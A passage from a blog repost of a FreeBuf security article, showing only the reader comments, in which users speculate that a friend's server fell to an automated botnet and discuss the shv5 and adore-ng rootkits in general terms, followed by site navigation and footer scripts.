<li><a href="http://www.freebuf.com/?author=4129" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Rozero" target="_blank">Rozero </a> (2级) 酱油桑 <a href=""></a> 2013-09-11    6楼</li>
</ul>
<p>比较弱智的小骇客的行为，对比足迹也没做任何处理，说明是自动化完成的。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15586#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxx <a href=""></a> 2013-09-11</li>
</ul>
<p>@Rozero  这个不能叫弱智，人家是botnat，讲的是数量。这种粗暴的破坏原有系统，不做任何痕迹清理，显然是被批量抓鸡了
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/articles/system/?replytocom=15587#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4129" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Rozero" target="_blank">Rozero </a> (2级) 酱油桑 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx
嗯，是自动化行为，所以隐藏的比较粗糙，刚去分析了下这个shv5的rootkit，这个rootkit本身做的也比较粗糙，是基于替换文件的方式来完成的，并且也没做端口隐藏，通过strace一览无余。。
推荐有兴趣的朋友可以去分析下adore-ng这个rootkit，这个rootkit做的比较精致，知其然知其所以然，可好好了解下设计原理，更容易从设计角度来分析。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15601#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@Rozero  恩。我也是分析shv5的时候发现的这文章。感谢回复。希望可以多多交流。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15614#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxx <a href=""></a> 2013-09-11    7楼</li>
</ul>
<p>2007年4月9日。。。。。。。，这-。-！！！！！！！！！！
<a href="">亮了</a>(18)
<a href="http://www.freebuf.com/articles/system/?replytocom=15588#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx 我也来亮一个
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15593#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> 暴龙哥 <a href=""></a> 2013-09-11</li>
</ul>
<p>@xxx 虽然是几年前的文章，但是的确是个好东西。
也许大家都一头扎进了APT，但是这个分析案例也不失为一个攻守学习的经典案例啊。
<a href="">亮了</a>(1)
<a href="http://www.freebuf.com/articles/system/?replytocom=15597#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=748" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/litdg" target="_blank">litdg </a> (2级) 我很懒。。。 <a href=""></a> 2013-09-11</li>
</ul>
<p>@暴龙哥 你懂我！！！感谢
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15602#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=2918" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/Draycen" target="_blank">Draycen </a> (1级)  <a href=""></a> 2013-09-11    8楼</li>
</ul>
<p><img src="" alt=":cool:"> 路过
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15592#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> helen <a href=""></a> 2013-09-11    9楼</li>
</ul>
<p>Holiday cracking Monday, 09 April 2007
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15598#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=4398" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/逝情" target="_blank">逝情 </a> (1级) 弱爆了，求带~ <a href=""></a> 2013-09-11    10楼</li>
</ul>
<p>似乎，很高端的样子。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15600#respond" target="_blank">回复</a></p>
<ul>
<li><a href="http://www.freebuf.com/?author=1070" target="_blank"><img src="" alt=""></a> <a href="http://www.freebuf.com/author/p0tt1" target="_blank">p0tt1 </a><img src="http://www.freebuf.com/buf/themes/freebuf/images/medals/f1.png" alt="" title="FB达人"> (4级) 论之语网络安全工程师，Sniffer组员，NTsafe站长 <a href=""></a> 2013-09-11    11楼</li>
</ul>
<p>其实老外也有批量抓鸡的~但是按照楼主描述的安全配置的强度 不像能被抓到的~
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/system/?replytocom=15604#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""> xxoo <a href=""></a> 2013-09-12    12楼</li>
</ul>
<p>jboss /tomcat 等都有蠕虫吧<figure class="highlight"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="code"><pre>[<span class="link_label">亮了</span>](<span class="link_url"></span>)(1)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15623#respond</span>)
<span class="bullet">* </span>[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url">http://www.freebuf.com/?author=4790</span>) [<span class="link_label">Leo-o </span>](<span class="link_url">http://www.freebuf.com/author/Leo-o</span>) (1级)  []() 2013-09-12    13楼

Mark , 涨姿势了。
[<span class="link_label">亮了</span>](<span class="link_url"></span>)(0)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15676#respond</span>)
<span class="bullet">* </span>[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url">http://www.freebuf.com/?author=4025</span>) [<span class="link_label">心在想念 </span>](<span class="link_url">http://www.freebuf.com/author/心在想念</span>) (1级) 道，可道，非常道！名，可名，非常名！ []() 2013-09-13    14楼

高端。。。。。。。。。。。。。。
[<span class="link_label">亮了</span>](<span class="link_url"></span>)(0)
[<span class="link_label">回复</span>](<span class="link_url">http://www.freebuf.com/articles/system/?replytocom=15679#respond</span>)
昵称
(必须)您当前尚未登录。[<span class="link_label">登陆</span>](<span class="link_url">http://www.freebuf.com/wp-login.php?redirect_to=http%3A%2F%2Ffreebuf.com%2Farticles%2Fsystem%2F12443.html "登陆"</span>)？注册

邮箱
必须(保密)

发表言论前，请滑动滚动条解锁
[<span class="link_label">表情</span>](<span class="link_url"></span>)[<span class="link_label">插代码</span>](<span class="link_url"></span>)[<span class="link_label">插图</span>](<span class="link_url"></span>)

[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "mrgreen"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "razz"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "sad"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "smile"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "oops"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "grin"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "eek"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "???"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "cool"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "lol"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "mad"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "twisted"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "roll"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "wink"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "idea"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "arrow"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "neutral"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "cry"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "?"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "evil"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "shock"</span>)[<span class="link_label">![</span>](<span class="link_url"></span>)](<span class="link_url"> "!"</span>)
正在提交, 请稍候...

/#

[取消]()   有人回复时邮件通知我

<span class="header">### **本文这些评论亮了![]()[捐助我们](http://www.freebuf.com/donate)****Hot Comments**</span>

[xxx]() @ 2013-09-11 13:12:28

2007年4月9日。。。。。。。，这-。-！！！！！！！！！！
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (18) [xt9]() @ 2013-09-11 11:01:53

一个普通的web蠕虫+IRC木马 而已。 据老衲的经验 十之八九 是 IRC木马 自动攻击了你朋友的web服务器，通过蠕虫的web漏洞攻击插件，获得了权限，提权，下载安装木马，然后你朋友服务器就成了这僵尸网络中一个普普通通的 肉鸡。 文中提及的诸多入侵者的纰漏都是因为 自动脚本完成的，所以没那么精致。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (10) [Helen]() @ 2013-09-11 11:17:36

我国外的小弟做的
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (7) [xt9]() @ 2013-09-11 11:26:42

@litdg  ![](http://static.freebuf.com/uploads/image/20130911/20130911000441_59774.jpg)
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (6) [litdg]() @ 2013-09-11 13:36:34

@xt9 长见识了啊。不知道能否约个稿，在fb写文介绍一下相关技术。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (6) [whitemonty]() @ 2013-09-11 10:33:01

欢迎收看黑客追踪第一季
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (5) [xxx]() @ 2013-09-11 13:09:31

@Rozero  这个不能叫弱智，人家是botnat，讲的是数量。这种粗暴的破坏原有系统，不做任何痕迹清理，显然是被批量抓鸡了
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (2) [暴龙哥]() @ 2013-09-11 14:43:13

@xxx 虽然是几年前的文章，但是的确是个好东西。 也许大家都一头扎进了APT，但是这个分析案例也不失为一个攻守学习的经典案例啊。
[<span class="link_label">亮了</span>](<span class="link_url"></span>) (1) [xxoo]() @ 2013-09-12 10:25:42

jboss /tomcat 等都有蠕虫吧
</pre></td></tr></table></figure></p>
<p><a href="">亮了</a> (1)</p>
<h3 id="-new-posts-"><strong>最新发布**</strong>New Posts**</h3>
<ul>
<li><a href="http://www.freebuf.com/tools/13103.html" title="知名安全扫描工具AWVS 9（破解版下载）" target="_blank">知名安全扫描工具AWVS 9（破解版下载）</a></li>
<li><a href="http://www.freebuf.com/news/13031.html" title="喜剧：巴西黑客欲攻击NSA，结果NASA躺枪" target="_blank">喜剧：巴西黑客欲攻击NSA，结果NASA躺枪</a></li>
<li><a href="http://www.freebuf.com/news/13094.html" title="FireEye：中国黑客攻击美国无人机制造商" target="_blank">FireEye：中国黑客攻击美国无人机制造商</a></li>
<li><a href="http://www.freebuf.com/news/13081.html" title="解放区？上海自贸区将不设防火长城" target="_blank">解放区？上海自贸区将不设防火长城</a></li>
<li><a href="http://www.freebuf.com/tools/13073.html" title="DNS隧道制造工具——iodine" target="_blank">DNS隧道制造工具——iodine</a></li>
<li><a href="http://www.freebuf.com/tools/13063.html" title="网站指纹识别工具——WhatWeb v0.4.7发布" target="_blank">网站指纹识别工具——WhatWeb v0.4.7发布</a></li>
<li><a href="http://www.freebuf.com/news/13047.html" title="每月偷窃$50000美金的19岁阿根廷黑客被捕" target="_blank">每月偷窃$50000美金的19岁阿根廷黑客被捕</a></li>
<li><a href="http://www.freebuf.com/news/13010.html" title="国外发现勒索软件借助NSA棱镜事件行骗" target="_blank">国外发现勒索软件借助NSA棱镜事件行骗</a></li>
<li><a href="http://www.freebuf.com/news/12989.html" title="世界最大的数据库泄露统计" target="_blank">世界最大的数据库泄露统计</a></li>
<li><a href="http://www.freebuf.com/video/12984.html" title="十字路口的守望者：17岁白帽黑客的成长之路（视频）" target="_blank">十字路口的守望者：17岁白帽黑客的成长之路（视频）</a>
<img src="" alt=""> 微信扫描上图订阅freebuf，每日精华文章推送。
All of the material and the informations available on freebuf. com is for informative purpose. freebuf.com declines all responsibilities from the damage that may be done of it, consequently it does not encourage who might use it for illegal purposes.</li>
</ul>
<h3 id="freebuf-com">FREEBUF.COM</h3>
<p><a href="http://www.freebuf.com/dis" target="_blank">免责声明</a> <a href="http://www.freebuf.com/friends" target="_blank">友情链接</a> <a href="http://www.freebuf.com/newsend" target="_blank">我要投稿</a>
<a href="http://www.freebuf.com/others/864.html" target="_blank">关于我们</a> <a href="http://www.freebuf.com/partner" target="_blank">合作伙伴</a> <a href="http://www.freebuf.com/contact" target="_blank">联系我们</a></p>
<p>Copyright @ 2012 WWW.FREEBUF.COM All Rights Reserved <a href="http://www.miibeian.gov.cn/" target="_blank">沪ICP备13033796号-1</a>
<a href=""></a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:38"datetime="2014-03-07 09:54:38"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--一次服务器被入侵后的分析/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--一次服务器被入侵后的分析" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>





<ul id="pagination" class="pagination pagination-lg">
  <li><a class="extend prev" href="/page/93/">&laquo;</a></li><li><a class="page-number" href="/">1</a></li><li><a class="page-number" href="/page/2/">2</a></li><li><span class="space">&hellip;</span></li><li><a class="page-number" href="/page/91/">91</a></li><li><a class="page-number" href="/page/92/">92</a></li><li><a class="page-number" href="/page/93/">93</a></li><li class="active"><li><span class="page-number current">94</span></li><li><a class="page-number" href="/page/95/">95</a></li><li><a class="page-number" href="/page/96/">96</a></li><li><a class="page-number" href="/page/97/">97</a></li><li><span class="space">&hellip;</span></li></li><li><a class="page-number" href="/page/164/">164</a></li><li><a class="page-number" href="/page/165/">165</a></li><li><a class="extend next" href="/page/95/">&raquo;</a></li>
  <div class="clearfix"></div>
</ul></div><!--wapper-->
       </div><!-- ID main-col END -->
       <aside id="sidebar" class="alignright col-sx-6 col-sm-4 col-md-3 col-lg-3">
<div id="widget_search" class="widget panel panel-primary">
    <form action="//google.com/search" method="get" accept-charset="utf-8">
  <div class="input-group">
    <input class="form-control" id="searchbox" type="search" name="q" results="0" placeholder="search">
    <span class="input-group-btn">
      <button class="btn btn-default" type="submit">Go!</button>
    </span>
    <input type="hidden" name="q" value="site:itsolife.com">
  </div>
</form>
</div>

<div id="widget_category" class="widget panel panel-primary">
  <div class="panel-heading">category</div>  <div data-src='category' class='ajax_widgets'>正在加载...</div>
</div>

<div id="widget_recent_posts" class="widget panel panel-primary">
  <div class="panel-heading">recent posts</div>  <div data-src='recent_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_tagcloud" class="widget panel panel-primary">
  <div class="panel-heading">tagcloud</div>  <div data-src='tagcloud' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_latest_update_posts" class="widget panel panel-primary">
  <div class="panel-heading">最近更新</div>  <div data-src='latest_update_posts' class='ajax_widgets'>正在加载...</div></div>

<div id="widget_recent_comments" class="widget panel panel-primary">
  <div class="panel-heading">recent comments</div>  

<div class="list-group-item ds-recent-comments" data-num-items="6" data-show-avatars="1" data-show-time="1" data-show-title="1" data-show-admin="1" data-excerpt-length="50"></div>



</div>

</aside>
       <div class="clearfix"></div>
     </div><!-- row END -->
  </div>
  <footer id="footer" class="container">
  <div class="panel panel-info">
  <section id='footer_widget'></section>  <div class="panel-footer">
  <div id="site-info">
    <span class='author'>
  
  &copy; 2014 RobinChia
  
    &nbsp;&nbsp;</span>
  
  <span id='analytics-51la'></span><span id='analytics-google'>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-48559895-1']);
  _gaq.push(['_trackPageview']);
  _js2load.push({src:('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'});
</script></span><span id='analytics-cnzz'>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5774006'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s17.cnzz.com/stat.php%3Fid%3D5774006%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
</span><span id='analytics-baidu'>
<script>
var _hmt = _hmt || [];
_js2load.push({src:"//hm.baidu.com/hm.js?1442f50724afc42380b51f097c43082c"});
</script>
</span>  </div>
  <div id="copyright">Blog powered by <a href='http://zespia.tw/hexo/'><strong>hexo</strong></a> Theme <strong><a href='https://github.com/chenall/hexo-theme-chenall'>chenall</a></strong>(Some change in it)<span class="pull-right"> 更新时间: <em>2014-03-15 20:45:44</em></span></div>
</div>
<div class="clearfix"></div>


  </div>
  </footer>
  
        <script src="http://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>        
        <script src="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>        
                
        <script src="http://cdn.bootcss.com/prettify/r298/prettify.min.js"></script>    <script type="text/javascript">
   var lang=["bsh", "c", "cc", "cpp", "cs", "csh", "cyc", "cv", "htm", "html",
    "java", "js", "m", "mxml", "perl", "pl", "pm", "py", "rb", "sh",
    "xhtml", "xml", "xsl"];
   var pretty_base='';
   $('script').each(function(){
	var c = $(this).attr('src');
	if (!c)
	    return;
	if (c.match(/(\/)?prettify(\.min)?\.js/i))
	{
	    var index = c.lastIndexOf('/');
	    if (index != -1)
		pretty_base = c.substr(0,index + 1);
	    return false;
	}
   })
   $('pre code').each(function(){
	var c = $(this).attr('class')
	if (!c)
	    return;
	c = c.match(/\s?(lang\-\w+)/i);
	if (c && lang.indexOf(c[1]) == -1)
	{
	    lang.push(c[1]);
	    $.getScript(pretty_base + c[1] + '.min.js');
	}
   })

    $(window).load(function(){
       $("pre").addClass("prettyprint");
       prettyPrint();
    })
</script>    
            <script type="text/javascript">
var duoshuoQuery = {short_name:"robinchia"};
_js2load.push({src:'http://static.duoshuo.com/embed.js',charset:'UTF-8'});
</script>
    
            <!--wumii_relatedItems-->
    
        <script src="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js"></script>    <script type="text/javascript">
(function($){
  $('.entry').each(function(i){
    $(this).find('img').each(function(){
      var alt = this.alt;

      if (alt){
        $(this).before('<span class="caption">' + alt + '</span>');
      }

      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="fancybox' + i + '" />');
    });
  });

  $('.fancybox').fancybox();
})(jQuery);
</script>    
        <script src="http://cdn.bootcss.com/mathjax/2.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>    <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>
    
<script type="text/javascript">
$('.ajax_widgets').each(function(){var src=$(this).attr('data-src');if(src)$(this).load('/widgets/'+src+'.html');});
$.each(_js2load,function(index,obj){loadjs(obj.src,obj.charset)});
</script>

<div id="scroll2top">
<img src="/scroll2top/arrow.png"/>
</div>
<script src="/scroll2top/scroll2top.min.js"></script>
<div id="winterland">
  <canvas></canvas>
</div>
<script src="/js/winterland.min.js"></script>

  </body>
</html>
